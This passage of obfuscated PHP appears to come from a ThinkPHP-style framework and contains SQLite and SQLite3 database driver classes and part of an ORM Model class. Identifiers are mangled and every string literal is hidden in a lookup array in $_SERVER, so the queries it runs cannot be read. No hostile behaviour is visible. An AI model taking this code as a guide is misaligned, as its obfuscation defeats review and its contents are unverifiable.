($this->queryID) { $this->free(); } think_action_status($ÉºÏ–’Ç[23], 1); think_status($ÉºÏ–’Ç[24]); $this->queryID = sqlite_query($this->_linkID, $ßãî¢ÊŞ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÃÈí‡Ş  = $this->getAll(); return $ÃÈí‡Ş ; } } public function execute($ï„–Ìœµ) { $§¤ŒÇ½ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ï„–Ìœµ; if ($this->queryID) { $this->free(); } think_action_status($§¤ŒÇ½[25], 1); think_status($§¤ŒÇ½[24]); $‘öä¯šŞ = sqlite_exec($this->_linkID, $ï„–Ìœµ); $this->debug(); if (!1 === $‘öä¯šŞ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¼’ç§¼´][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ñ­¬´—Š = sqlite_query($this->_linkID, $_SERVER[¼’ç§¼´][27]); if (!$Ñ­¬´—Š) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÏĞ˜òá‡ = sqlite_query($this->_linkID, $_SERVER[¼’ç§¼´][28]); if (!$ÏĞ˜òá‡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $„©Ñ‡Øø = array(); if ($this->numRows > 0) { for ($™ ö¦ö = 0; $™ ö¦ö < $this->numRows; $™ ö¦ö++) { $„©Ñ‡Øø[$™ ö¦ö] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $„©Ñ‡Øø; } public function getFields($î¦®­¥ù) { $ÓÃ°ìª =& $_SERVER[¼’ç§¼´]; $Ã•øú¿ = $this->query($ÓÃ°ìª[29] . $î¦®­¥ù . $ÓÃ°ìª[30]); $Ö˜§Â¥ = array(); if ($Ã•øú¿) { foreach ($Ã•øú¿ as $ß«ß÷¤ => $Ã÷µ’ô´) { $Ö˜§Â¥[$Ã÷µ’ô´[$ÓÃ°ìª[31]]] = array($ÓÃ°ìª[32] => $Ã÷µ’ô´[$ÓÃ°ìª[31]], $ÓÃ°ìª[33] => $Ã÷µ’ô´[$ÓÃ°ìª[34]], $ÓÃ°ìª[35] => (bool) ($Ã÷µ’ô´[$ÓÃ°ìª[36]] === $ÓÃ°ìª[12]), $ÓÃ°ìª[37] => $Ã÷µ’ô´[$ÓÃ°ìª[38]], $ÓÃ°ìª[39] => strtolower($Ã÷µ’ô´[$ÓÃ°ìª[40]]) == $ÓÃ°ìª[41], $ÓÃ°ìª[42] => strtolower($Ã÷µ’ô´[$ÓÃ°ìª[43]]) == $ÓÃ°ìª[44]); } } return $Ö˜§Â¥; } public function getTables($àĞÎÍÊ = '') { $¬ÆıÓç =& $_SERVER[¼’ç§¼´]; $Ãı‹«¦Ë = $this->query($¬ÆıÓç[45] . $¬ÆıÓç[46] . $¬ÆıÓç[47]); $×åëÖ¬ = array(); foreach ($Ãı‹«¦Ë as $‰şîØ×¢ => $²ÓÑ‚¥¤) { $×åëÖ¬[$‰şîØ×¢] = current($²ÓÑ‚¥¤); } return $×åëÖ¬; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $àĞè©åÕ =& $_SERVER[¼’ç§¼´]; $ßİ×ÖÂ” = sqlite_last_error($this->_linkID); $this->error = $ßİ×ÖÂ” . $àĞè©åÕ[4] . sqlite_error_string($ßİ×ÖÂ”); if ($àĞè©åÕ[12] != $this->queryStr) { $this->error .= LNG($àĞè©åÕ[48]) . $this->queryStr; } think_trace($this->error, $àĞè©åÕ[12], $àĞè©åÕ[49]); return $this->error; } public function escapeString($ä¬ôö³) { return sqlite_escape_string($ä¬ôö³); } public function parseLimit($ÏìåıçÙ) { $İ×¬ş™ =& $_SERVER[¼’ç§¼´]; $¼â¼À¶· = $İ×¬ş™[12]; if (!empty($ÏìåıçÙ)) { $ÏìåıçÙ = explode($İ×¬ş™[50], $ÏìåıçÙ); if (count($ÏìåıçÙ) > 1) { $¼â¼À¶· .= $İ×¬ş™[51] . $ÏìåıçÙ[1] . $İ×¬ş™[52] . $ÏìåıçÙ[0] . $İ×¬ş™[53]; } else { $¼â¼À¶· .= $İ×¬ş™[51] . $ÏìåıçÙ[0] . $İ×¬ş™[53]; } } return $¼â¼À¶·; } } class DbSqlite3Base extends Db { public function __construct($óÌâ±«Ò = '') { $â”íúõ™ =& $_SERVER[¼’ç§¼´]; if (!class_exists($â”íúõ™[54])) { think_exception(think_lang($â”íúõ™[14]) . $â”íúõ™[55]); } if (!empty($óÌâ±«Ò)) { if (!isset($óÌâ±«Ò[$â”íúõ™[16]])) { $óÌâ±«Ò[$â”íúõ™[16]] = 438; } $this->config = $óÌâ±«Ò; if (empty($this->config[$â”íúõ™[17]])) { $this->config[$â”íúõ™[17]] = array(); } } } public function connect($èÃé‚Ô› = '', $úäô”öª = 0) { $âç•›Çõ =& $_SERVER[¼’ç§¼´]; if (!isset($this->linkID[$úäô”öª])) { if (empty($èÃé‚Ô›)) { $èÃé‚Ô› = $this->config; } $this->linkID[$úäô”öª] = new SQLite3($èÃé‚Ô›[$âç•›Çõ[21]]); if (!$this->linkID[$úäô”öª]) { think_exception($this->linkID[$úäô”öª]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$úäô”öª]->busyTimeout(30000); if (1 != think_config($âç•›Çõ[22])) { unset($this->config); } } return $this->linkID[$úäô”öª]; } public function free() { $this->queryID = null; } public function query($˜¹ëÚÒ¤) { $ò™¶ªÚ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜¹ëÚÒ¤; if ($this->queryID) { $this->free(); } think_action_status($ò™¶ªÚ[23], 1); think_status($ò™¶ªÚ[24]); $this->queryID = $this->_linkID->query($˜¹ëÚÒ¤); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $·£™æ×› = $this->getAll(); $this->numRows = count($·£™æ×›); return $·£™æ×›; } } public function execute($ü¶Ø‘ªÏ) { $šæäÄãœ =& $_SERVER[¼’ç§¼´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü¶Ø‘ªÏ; if ($this->queryID) { $this->free(); } think_action_status($šæäÄãœ[25], 1); think_status($šæäÄãœ[24]); $¿×É™öö = $this->_linkID->exec($ü¶Ø‘ªÏ); $this->debug(); if (!1 === $¿×É™öö) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¼’ç§¼´][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $“¼Å¥Ò = $this->_linkID->query($_SERVER[¼’ç§¼´][27]); if (!$“¼Å¥Ò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ åË¼é˜ = $this->_linkID->query($_SERVER[¼’ç§¼´][28]); if (!$ åË¼é˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Òƒêâ‡¯ = array(); while ($è¶­“ ù = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Òƒêâ‡¯[] = $è¶­“ ù; } $this->queryID->reset(); return $Òƒêâ‡¯; } public function getFields($şÂ™¹£É) { $·ßÒµ¦Ö =& $_SERVER[¼’ç§¼´]; $Êš§µè‚ = $this->query($·ßÒµ¦Ö[29] . $şÂ™¹£É . $·ßÒµ¦Ö[30]); $ªÕÙ™Ç· = array(); if ($Êš§µè‚) { foreach ($Êš§µè‚ as $ùìë´¢º => $¤‰›¹ƒ) { $ªÕÙ™Ç·[$¤‰›¹ƒ[$·ßÒµ¦Ö[32]]] = array($·ßÒµ¦Ö[32] => $¤‰›¹ƒ[$·ßÒµ¦Ö[32]], $·ßÒµ¦Ö[33] => $¤‰›¹ƒ[$·ßÒµ¦Ö[33]], $·ßÒµ¦Ö[35] => (bool) ($¤‰›¹ƒ[$·ßÒµ¦Ö[35]] === $·ßÒµ¦Ö[12]), $·ßÒµ¦Ö[37] => $¤‰›¹ƒ[$·ßÒµ¦Ö[56]], $·ßÒµ¦Ö[39] => (bool) $¤‰›¹ƒ[$·ßÒµ¦Ö[57]], $·ßÒµ¦Ö[42] => (bool) $¤‰›¹ƒ[$·ßÒµ¦Ö[57]]); } } return $ªÕÙ™Ç·; } public function getTables($úïò = '') { $ ’âÖÚ =& $_SERVER[¼’ç§¼´]; $–ëñ¡™‘ = $this->query($ ’âÖÚ[45] . $ ’âÖÚ[46] . $ ’âÖÚ[47]); $Ò²¬ñ¼Í = array(); foreach ($–ëñ¡™‘ as $‰öĞ¨ºà => $í­»ß€¢) { $Ò²¬ñ¼Í[$‰öĞ¨ºà] = current($í­»ß€¢); } return $Ò²¬ñ¼Í; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ô“İœš£ =& $_SERVER[¼’ç§¼´]; $this->error = $this->_linkID->lastErrorMsg(); if ($ô“İœš£[12] != $this->queryStr) { $this->error .= LNG($ô“İœš£[48]) . $this->queryStr; } think_trace($this->error, $ô“İœš£[12], $ô“İœš£[49]); return $this->error; } public function escapeString($šÄËÀ–) { $úÇî§” =& $_SERVER[¼’ç§¼´]; if ($this->_linkID) { return $this->_linkID->escapeString($šÄËÀ–); } return str_ireplace($úÇî§”[58], $úÇî§”[59], $šÄËÀ–); } public function parseLimit($“í˜Šé) { $½İ™´İ˜ =& $_SERVER[¼’ç§¼´]; $§õğ™˜Ë = $½İ™´İ˜[12]; if (!empty($“í˜Šé)) { $“í˜Šé = explode($½İ™´İ˜[50], $“í˜Šé); if (count($“í˜Šé) > 1) { $§õğ™˜Ë .= $½İ™´İ˜[51] . $“í˜Šé[1] . $½İ™´İ˜[52] . $“í˜Šé[0] . $½İ™´İ˜[53]; } else { $§õğ™˜Ë .= $½İ™´İ˜[51] . $“í˜Šé[0] . $½İ™´İ˜[53]; } } return $§õğ™˜Ë; } } goto c«½êÓµ; a°¥Ÿ«ëÁğ: define($_SERVER[¼’ç§¼´][319], 3); define($_SERVER[¼’ç§¼´][320], 1); define($_SERVER[¼’ç§¼´][321], 0); goto B´³†ìÆìà; B´³†ìÆìà: define($_SERVER[¼’ç§¼´][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\157\162\x64\x65\162", "\x61\154\x69\x61\x73", "\x68\x61\x76\151\156\x67", "\x67\x72\x6f\165\160", "\154\x6f\143\x6b", "\x64\151\163\164\151\x6e\x63\164", "\141\165\x74\157", "\x66\x69\154\164\145\x72", "\166\141\154\x69\x64\x61\x74\x65", "\x72\145\x73\x75\154\164", "\142\x69\156\x64", "\x74\157\x6b\145\156"); public function __construct($ÒÂ¥öêã = '', $µÙœ€“Ú = '', $…õ•Õ¾£ = '') { $Ü„³è‡æ =& $_SERVER[¼’ç§¼´]; $this->_initialize(); if (!empty($ÒÂ¥öêã)) { if (strpos($ÒÂ¥öêã, $Ü„³è‡æ[10])) { list($this->dbName, $this->name) = explode($Ü„³è‡æ[10], $ÒÂ¥öêã); } else { $this->name = $ÒÂ¥öêã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($µÙœ€“Ú)) { $this->tablePrefix = $Ü„³è‡æ[12]; } elseif ($Ü„³è‡æ[12] != $µÙœ€“Ú) { $this->tablePrefix = $µÙœ€“Ú; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Ü„³è‡æ[323]); } $this->db(0, empty($this->connection) ? $…õ•Õ¾£ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $á±Ş÷“Ö =& $_SERVER[¼’ç§¼´]; if (empty($this->fields)) { if (think_config($á±Ş÷“Ö[324])) { $ğãş×çò = $this->dbName ? $this->dbName : think_config($á±Ş÷“Ö[325]); $—œÆª» = think_var_cache($á±Ş÷“Ö[326] . strtolower(get_path_this($ğãş×çò) . $á±Ş÷“Ö[10] . $this->name)); if ($—œÆª») { $Ê±”‚°‚ = think_config($á±Ş÷“Ö[327]); if (empty($Ê±”‚°‚) || $—œÆª»[$á±Ş÷“Ö[328]] == $Ê±”‚°‚) { $this->fields = $—œÆª»; return; } } } $this->flush(); } } public function flush() { $Ô…¢‹Çá =& $_SERVER[¼’ç§¼´]; $this->db->setModel($this->name); $’ö±„³ = $this->db->getFields($this->getTableName()); if (!$’ö±„³) { return !1; } $this->fields = array_keys($’ö±„³); $this->fields[$Ô…¢‹Çá[329]] = !1; foreach ($’ö±„³ as $îôÖ°ÁŞ => $Ê± «‚À) { $È¯Ğ‡Éí[$îôÖ°ÁŞ] = $Ê± «‚À[$Ô…¢‹Çá[33]]; if ($Ê± «‚À[$Ô…¢‹Çá[39]]) { $this->fields[$Ô…¢‹Çá[330]] = $îôÖ°ÁŞ; if ($Ê± «‚À[$Ô…¢‹Çá[42]]) { $this->fields[$Ô…¢‹Çá[329]] = !0; } } } $this->fields[$Ô…¢‹Çá[331]] = $È¯Ğ‡Éí; if (think_config($Ô…¢‹Çá[327])) { $this->fields[$Ô…¢‹Çá[328]] = think_config($Ô…¢‹Çá[327]); } if (think_config($Ô…¢‹Çá[324])) { $‘ó¡óÅ = $this->dbName ? $this->dbName : think_config($Ô…¢‹Çá[325]); think_var_cache($Ô…¢‹Çá[326] . strtolower(get_path_this($‘ó¡óÅ) . $Ô…¢‹Çá[10] . $this->name), $this->fields); } } public function switchModel($ºŸç¾Ì¤, $«Ú¦¶ª­ = array()) { $ÖÛ¶Èş =& $_SERVER[¼’ç§¼´]; $÷ĞÉ˜Éê = ucwords(strtolower($ºŸç¾Ì¤)) . $ÖÛ¶Èş[332]; if (!class_exists($÷ĞÉ˜Éê)) { think_exception($÷ĞÉ˜Éê . think_lang($ÖÛ¶Èş[333])); } $this->_extModel = new $÷ĞÉ˜Éê($this->name); if (!empty($«Ú¦¶ª­)) { foreach ($«Ú¦¶ª­ as $±Û±ÕÖ) { $this->_extModel->setProperty($±Û±ÕÖ, $this->{$±Û±ÕÖ}); } } return $this->_extModel; } public function __set($»°²ŸÑ, $Ü™¬°¥) { $this->data[$»°²ŸÑ] = $Ü™¬°¥; } public function __get($“Ïºõ) { return isset($this->data[$“Ïºõ]) ? $this->data[$“Ïºõ] : null; } public function __isset($şåùùÉË) { return isset($this->data[$şåùùÉË]); } public function __unset($¥¦«‰­) { unset($this->data[$¥¦«‰­]); } public function __call($â®ÆÏ†Ã, $ö—òÔè) { $ÅÃ‹şÎŒ =& $_SERVER[¼’ç§¼´]; if (in_array(strtolower($â®ÆÏ†Ã), $this->methods, !0)) { $this->options[strtolower($â®ÆÏ†Ã)] = $ö—òÔè[0]; return $this; } elseif (in_array(strtolower($â®ÆÏ†Ã), array($ÅÃ‹şÎŒ[334], $ÅÃ‹şÎŒ[335], $ÅÃ‹şÎŒ[336], $ÅÃ‹şÎŒ[337], $ÅÃ‹şÎŒ[338]), !0)) { $ƒì³Î¦ = isset($ö—òÔè[0]) ? $ö—òÔè[0] : $ÅÃ‹şÎŒ[222]; $ƒì³Î¦ = $this->db->parseKey($ƒì³Î¦); return $this->getField(strtoupper($â®ÆÏ†Ã) . $ÅÃ‹şÎŒ[339] . $ƒì³Î¦ . $ÅÃ‹şÎŒ[340] . $â®ÆÏ†Ã, $ÅÃ‹şÎŒ[334]); } elseif (strtolower(substr($â®ÆÏ†Ã, 0, 5)) == $ÅÃ‹şÎŒ[341]) { $ƒì³Î¦ = think_parse_name(substr($â®ÆÏ†Ã, 5)); $Ã››ğ¤ğ[$ƒì³Î¦] = $ö—òÔè[0]; return $this->where($Ã››ğ¤ğ)->find(); } elseif (strtolower(substr($â®ÆÏ†Ã, 0, 10)) == $ÅÃ‹şÎŒ[342]) { $¬¦ªÙ² = think_parse_name(substr($â®ÆÏ†Ã, 10)); $Ã››ğ¤ğ[$¬¦ªÙ²] = $ö—òÔè[0]; return $this->where($Ã››ğ¤ğ)->getField($ö—òÔè[1]); } elseif (isset($this->_scope[$â®ÆÏ†Ã])) { return $this->scope($â®ÆÏ†Ã, $ö—òÔè[0]); } elseif (method_exists($this, $â®ÆÏ†Ã)) { array_unshift($ö—òÔè, $â®ÆÏ†Ã); return call_user_func_array(array($this, $ÅÃ‹şÎŒ[343]), $ö—òÔè); } else { return call_user_func_array(array(parent, $â®ÆÏ†Ã), $ö—òÔè); } } protected function call() { $ÖÕüúÎŠ =& $_SERVER[¼’ç§¼´]; $¤Ã¯¢ù¶ = func_get_args(); $™·±ä”ò = array_shift($¤Ã¯¢ù¶); $”Ó•ê× = $™·±ä”ò; if (is_array($™·±ä”ò)) { $”Ó•ê× = $™·±ä”ò[1]; $™·±ä”ò = $™·±ä”ò[0]; } $Õ£¯ºÛ½ = count($¤Ã¯¢ù¶) - 1; if (isset($¤Ã¯¢ù¶[$Õ£¯ºÛ½]) && $¤Ã¯¢ù¶[$Õ£¯ºÛ½] === $™·±ä”ò) { think_exception(__CLASS__ . $ÖÕüúÎŠ[4] . $™·±ä”ò . think_lang($ÖÕüúÎŠ[344])); return; } $¤Ã¯¢ù¶[] = $™·±ä”ò; if (method_exists($this, $ÖÕüúÎŠ[345])) { $¬ôº¥‘‘ = call_user_func_array(array($this, $ÖÕüúÎŠ[346]), array($”Ó•ê×, $¤Ã¯¢ù¶)); if (!is_null($¬ôº¥‘‘) && $¬ôº¥‘‘ !== !1) { return $¬ôº¥‘‘; } } $¸öğøß¶ = call_user_func_array(array($this, $™·±ä”ò), $¤Ã¯¢ù¶); if (method_exists($this, $ÖÕüúÎŠ[347])) { $¬ôº¥‘‘ = call_user_func_array(array($this, $ÖÕüúÎŠ[348]), array($”Ó•ê×, $¤Ã¯¢ù¶, $¸öğøß¶)); if ($¬ôº¥‘‘) { return $¬ôº¥‘‘; } } return $¸öğøß¶; } protected function _initialize() { } protected function _facade($¾´ü…îß) { $í‡é—° =& $_SERVER[¼’ç§¼´]; if (!empty($this->fields)) { foreach ($¾´ü…îß as $ÀËçé• => $‘¶³á—Ê) { if (is_array($this->fields) && !in_array($ÀËçé•, $this->fields, !0)) { unset($¾´ü…îß[$ÀËçé•]); } elseif (is_scalar($‘¶³á—Ê)) { $this->_parseType($¾´ü…îß, $ÀËçé•); } } } if (!empty($this->options[$í‡é—°[349]])) { $¾´ü…îß = array_map($this->options[$í‡é—°[349]], $¾´ü…îß); unset($this->options[$í‡é—°[349]]); } $this->_beforeWrite($¾´ü…îß); return $¾´ü…îß; } protected function _beforeWrite(&$¬Ÿˆªœú) { } public function add($ì£º¿Åü = '', $÷şÚœñ = array(), $²¸¨Ä™ = false) { if (empty($ì£º¿Åü)) { if (!empty($this->data)) { $ì£º¿Åü = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¼’ç§¼´][350]); return !1; } } $÷şÚœñ = $this->_parseOptions($÷şÚœñ); $ì£º¿Åü = $this->_facade($ì£º¿Åü); if (!1 === $this->_beforeInsert($ì£º¿Åü, $÷şÚœñ)) { return !1; } $‡†½è«± = $this->db->insert($ì£º¿Åü, $÷şÚœñ, $²¸¨Ä™); if (!1 !== $‡†½è«±) { $ıéŸ¸Ú = $this->getLastInsID(); if ($ıéŸ¸Ú) { $ì£º¿Åü[$this->getPk()] = $ıéŸ¸Ú; $this->_after_insert($ì£º¿Åü, $÷şÚœñ); return $ıéŸ¸Ú; } $this->_after_insert($ì£º¿Åü, $÷şÚœñ); } return $‡†½è«±; } protected function _beforeInsert(&$ä¤îÇ®Õ, $ŸÎº¦«) { } protected function _after_insert($ƒ‚Ş©®, $ºúá½ã´) { } public function addAll($îØÔ˜àİ, $ºÂş = array(), $ö«÷ÔòÆ = false) { $À¶¦ÑŒı =& $_SERVER[¼’ç§¼´]; if (empty($îØÔ˜àİ)) { $this->error = think_lang($À¶¦ÑŒı[350]); return !1; } $ºÂş = $this->_parseOptions($ºÂş); foreach ($îØÔ˜àİ as $êúÛüùå => $“ê ” ) { $îØÔ˜àİ[$êúÛüùå] = $this->_facade($“ê ” ); } if (method_exists($this->db, $À¶¦ÑŒı[351])) { $Ã¡™£  = $this->db->insertAll($îØÔ˜àİ, $ºÂş, $ö«÷ÔòÆ); } else { $this->startTrans(); foreach ($îØÔ˜àİ as $êúÛüùå => $“ê ” ) { $Ã¡™£  = $this->db->insert($“ê ” , $ºÂş, $ö«÷ÔòÆ); } $this->commit(); } if (!1 !== $Ã¡™£ ) { $¡Ëïä‡ = $this->getLastInsID(); if ($¡Ëïä‡) { return $¡Ëïä‡; } } return $Ã¡™£ ; } public function selectAdd($’ÒÅ”¸ˆ = '', $Àß¬ÎØú = '', $ë…ÜéÀ‡ = array()) { $—Ü¨ê¢ø =& $_SERVER[¼’ç§¼´]; $ë…ÜéÀ‡ = $this->_parseOptions($ë…ÜéÀ‡); if (!1 === ($Õƒ÷Üç÷ = $this->db->selectInsert($’ÒÅ”¸ˆ ? $’ÒÅ”¸ˆ : $ë…ÜéÀ‡[$—Ü¨ê¢ø[352]], $Àß¬ÎØú ? $Àß¬ÎØú : $this->getTableName(), $ë…ÜéÀ‡))) { $this->error = think_lang($—Ü¨ê¢ø[353]); return !1; } else { return $Õƒ÷Üç÷; } } public function save($üÕ’Û Œ = '', $ªÛ°…è‰ = array()) { $÷¤§×ã =& $_SERVER[¼’ç§¼´]; if (empty($üÕ’Û Œ)) { if (!empty($this->data)) { $üÕ’Û Œ = $this->data; $this->data = array(); } else { $this->error = think_lang($÷¤§×ã[350]); return !1; } } $üÕ’Û Œ = $this->_facade($üÕ’Û Œ); $ªÛ°…è‰ = $this->_parseOptions($ªÛ°…è‰); $¥´ÙÈŞè = $this->getPk(); if (!isset($ªÛ°…è‰[$÷¤§×ã[354]])) { if (isset($üÕ’Û Œ[$¥´ÙÈŞè])) { $ ºÎÙÖğ[$¥´ÙÈŞè] = $üÕ’Û Œ[$¥´ÙÈŞè]; $ªÛ°…è‰[$÷¤§×ã[354]] = $ ºÎÙÖğ; unset($üÕ’Û Œ[$¥´ÙÈŞè]); } else { $this->error = think_lang($÷¤§×ã[353]); return !1; } } if (is_array($ªÛ°…è‰[$÷¤§×ã[354]]) && isset($ªÛ°…è‰[$÷¤§×ã[354]][$¥´ÙÈŞè])) { $«ã†äïƒ = $ªÛ°…è‰[$÷¤§×ã[354]][$¥´ÙÈŞè]; } if (!1 === $this->_beforeUpdate($üÕ’Û Œ, $ªÛ°…è‰)) { return !1; } $€°ß© = $this->db->update($üÕ’Û Œ, $ªÛ°…è‰); if (!1 !== $€°ß©) { if (isset($«ã†äïƒ)) { $üÕ’Û Œ[$¥´ÙÈŞè] = $«ã†äïƒ; } $this->_afterUpdate($üÕ’Û Œ, $ªÛ°…è‰); } return $€°ß©; } protected function _beforeUpdate(&$Ò›ğç§³, $Î¶ªû•«) { } protected function _afterUpdate($Ä½‡¤ş, $° ß·Ãò) { } public function delete($©ÛÇ«ªÙ = array()) { $ÇÎèæİ =& $_SERVER[¼’ç§¼´]; if (empty($©ÛÇ«ªÙ) && empty($this->options[$ÇÎèæİ[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $­µš˜ ˆ = $this->getPk(); if (is_numeric($©ÛÇ«ªÙ) || is_string($©ÛÇ«ªÙ)) { if (strpos($©ÛÇ«ªÙ, $ÇÎèæİ[50])) { $êÕÆ¯Ñ[$­µš˜ ˆ] = array($ÇÎèæİ[355], $©ÛÇ«ªÙ); } else { $êÕÆ¯Ñ[$­µš˜ ˆ] = $©ÛÇ«ªÙ; } $this->options[$ÇÎèæİ[354]] = $êÕÆ¯Ñ; } $©ÛÇ«ªÙ = $this->_parseOptions(); if (is_array($©ÛÇ«ªÙ[$ÇÎèæİ[354]]) && isset($©ÛÇ«ªÙ[$ÇÎèæİ[354]][$­µš˜ ˆ])) { $•ı’® = $©ÛÇ«ªÙ[$ÇÎèæİ[354]][$­µš˜ ˆ]; } $¨ã°ÓÇ‰ = $this->db->delete($©ÛÇ«ªÙ); if (!1 !== $¨ã°ÓÇ‰) { $èÑ¼‡Ã“ = array(); if (isset($•ı’®)) { $èÑ¼‡Ã“[$­µš˜ ˆ] = $•ı’®; } $this->_after_delete($èÑ¼‡Ã“, $©ÛÇ«ªÙ); } return $¨ã°ÓÇ‰; } protected function _after_delete($ÎÒÏ˜ÍÎ, $¦©‹ÇµÇ) { } public function select($ñ’×ï€ = array()) { $Ç¾×ø×ê =& $_SERVER[¼’ç§¼´]; if (is_string($ñ’×ï€) || is_numeric($ñ’×ï€)) { $¼˜ù°Ë = $this->getPk(); if (strpos($ñ’×ï€, $Ç¾×ø×ê[50])) { $Ô³²÷µ²[$¼˜ù°Ë] = array($Ç¾×ø×ê[355], $ñ’×ï€); } else { $Ô³²÷µ²[$¼˜ù°Ë] = $ñ’×ï€; } $this->options[$Ç¾×ø×ê[354]] = $Ô³²÷µ²; } elseif (!1 === $ñ’×ï€) { $ñ’×ï€ = $this->_parseOptions(); return $Ç¾×ø×ê[356] . $this->db->buildSelectSql($ñ’×ï€) . $Ç¾×ø×ê[357]; } $ñ’×ï€ = $this->_parseOptions(); $ïšû¥… = $this->db->select($ñ’×ï€); if (!1 === $ïšû¥…) { return !1; } if (empty($ïšû¥…)) { return null; } $this->_afterSelect($ïšû¥…, $ñ’×ï€); return $ïšû¥…; } protected function _afterSelect(&$®”…ìîß, $¾Šüïùâ) { } public function buildSql($’í¤·¾ = array()) { $Å©«×ï¾ =& $_SERVER[¼’ç§¼´]; $’í¤·¾ = $this->_parseOptions($’í¤·¾); return $Å©«×ï¾[356] . $this->db->buildSelectSql($’í¤·¾) . $Å©«×ï¾[357]; } public function optionsValue($‡š¦äºÙ = null) { if (is_null($‡š¦äºÙ)) { return $this->options; } elseif (is_array($‡š¦äºÙ)) { $this->options = array_merge($this->options, $‡š¦äºÙ); } } protected function _parseOptions($áÆ§½©£ = array()) { $æƒû›ñŞ =& $_SERVER[¼’ç§¼´]; if (is_array($áÆ§½©£)) { $áÆ§½©£ = array_merge($this->options, $áÆ§½©£); } $this->options = array(); if (!isset($áÆ§½©£[$æƒû›ñŞ[358]])) { $áÆ§½©£[$æƒû›ñŞ[358]] = $this->getTableName(); $ÌÇ©Ã»Ï = $this->fields; } else { $ÌÇ©Ã»Ï = $this->getDbFields(); } if (!empty($áÆ§½©£[$æƒû›ñŞ[359]])) { $áÆ§½©£[$æƒû›ñŞ[358]] .= $æƒû›ñŞ[53] . $áÆ§½©£[$æƒû›ñŞ[359]]; } $áÆ§½©£[$æƒû›ñŞ[360]] = $this->name; if (isset($áÆ§½©£[$æƒû›ñŞ[354]]) && is_array($áÆ§½©£[$æƒû›ñŞ[354]]) && !empty($ÌÇ©Ã»Ï) && !isset($áÆ§½©£[$æƒû›ñŞ[361]]) && !isset($áÆ§½©£[$æƒû›ñŞ[358]])) { foreach ($áÆ§½©£[$æƒû›ñŞ[354]] as $´šŸÓÔà => $‡›×‘Â) { $´šŸÓÔà = trim($´šŸÓÔà); if (in_array($´šŸÓÔà, $ÌÇ©Ã»Ï, !0)) { if (is_scalar($‡›×‘Â)) { $this->_parseType($áÆ§½©£[$æƒû›ñŞ[354]], $´šŸÓÔà); } } elseif (!is_numeric($´šŸÓÔà) && $æƒû›ñŞ[11] != substr($´šŸÓÔà, 0, 1) && !1 === strpos($´šŸÓÔà, $æƒû›ñŞ[10]) && !1 === strpos($´šŸÓÔà, $æƒû›ñŞ[339]) && !1 === strpos($´šŸÓÔà, $æƒû›ñŞ[214]) && !1 === strpos($´šŸÓÔà, $æƒû›ñŞ[286])) { unset($áÆ§½©£[$æƒû›ñŞ[354]][$´šŸÓÔà]); } } } $this->_options_filter($áÆ§½©£); return $áÆ§½©£; } protected function _options_filter(&$ùÃâ­Åé) { } protected function _parseType(&$ƒŒÊÓ‹, $®–±öûÏ) { $£ş€Âß =& $_SERVER[¼’ç§¼´]; if (empty($this->options[$£ş€Âß[362]][$£ş€Âß[4] . $®–±öûÏ])) { $õæ¤Ï = strtolower($this->fields[$£ş€Âß[331]][$®–±öûÏ]); if (!1 !== strpos($õæ¤Ï, $£ş€Âß[363])) { } elseif (!1 === strpos($õæ¤Ï, $£ş€Âß[364]) && !1 !== strpos($õæ¤Ï, $£ş€Âß[365])) { $ƒŒÊÓ‹[$®–±öûÏ] = intval($ƒŒÊÓ‹[$®–±öûÏ]); } elseif (!1 !== strpos($õæ¤Ï, $£ş€Âß[366]) || !1 !== strpos($õæ¤Ï, $£ş€Âß[367])) { $ƒŒÊÓ‹[$®–±öûÏ] = floatval($ƒŒÊÓ‹[$®–±öûÏ]); } elseif (!1 !== strpos($õæ¤Ï, $£ş€Âß[368])) { $ƒŒÊÓ‹[$®–±öûÏ] = (bool) $ƒŒÊÓ‹[$®–±öûÏ]; } } } public function find($Â„‡ÖÔÇ = array()) { $Ÿ¹Èå¡˜ =& 